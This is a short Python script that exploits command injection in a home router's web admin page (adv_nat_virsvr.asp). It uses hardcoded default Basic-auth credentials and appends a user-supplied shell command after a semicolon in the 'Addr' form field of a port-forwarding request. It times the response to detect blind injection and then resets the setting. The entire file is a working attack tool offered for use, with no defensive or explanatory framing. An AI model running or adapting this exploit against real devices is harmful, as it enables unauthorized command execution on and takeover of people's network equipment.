import requests
from collections import OrderedDict
import urllib.parse
import time
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-i", help="Injection to try", type=str, default='')
args = parser.parse_args()
injeciton = urllib.parse.quote_plus(args.i)

url = 'http://192.168.1.1:8080'

r = requests.get(url)
cookie = r.headers['Set-Cookie'].partition(';')[0]
print(cookie)

forwardingPath = '/cgi-bin/adv_nat_virsvr.asp'
requestHeaders = OrderedDict([
('Host', '192.168.1.1:8080'),
('Cache-Control', 'max-age=0'),
('Authorization', 'Basic dXNlcjp1c2Vy'),
('Upgrade-Insecure-Requests', '1'),
('Origin', 'http://192.168.1.1:8080'),
('Content-Type', 'application/x-www-form-urlencoded'),
('Referer', 'http://192.168.1.1:8080/cgi-bin/adv_nat_virsvr.asp'),
('Accept-Encoding', 'gzip, deflate'),
('Accept-Language', 'en-GB,en-US;q=0.9,en;q=0.8'),
('Cookie', cookie),
('Connection', 'close')
])

s = requests.Session()
s.headers = requestHeaders

data = 'isLocalPortSupport=Yes&editFlag=1&delFlag=1&editnum=0&SelectProtocol=TCP&start_port=80&end_port=80&Addr=192.168.1.103;' + injeciton + '&local_sport=80&local_eport=80&ACLPort=N%2FA&AccoutAclSupported=N%2FA'


start = time.time()
response = s.post(url + forwardingPath, data = data)
end = time.time()
print('Response took:' + str(end - start))
print(response)

print('running regular request without injeciton to reset it')
data = 'isLocalPortSupport=Yes&editFlag=0&delFlag=1&editnum=0&SelectProtocol=TCP&start_port=80&end_port=80&Addr=192.168.1.103&local_sport=80&local_eport=80&ACLPort=N%2FA&AccoutAclSupported=N%2FA'
response = s.post(url + forwardingPath, data = data)
print(response)
print('------------done----------------')
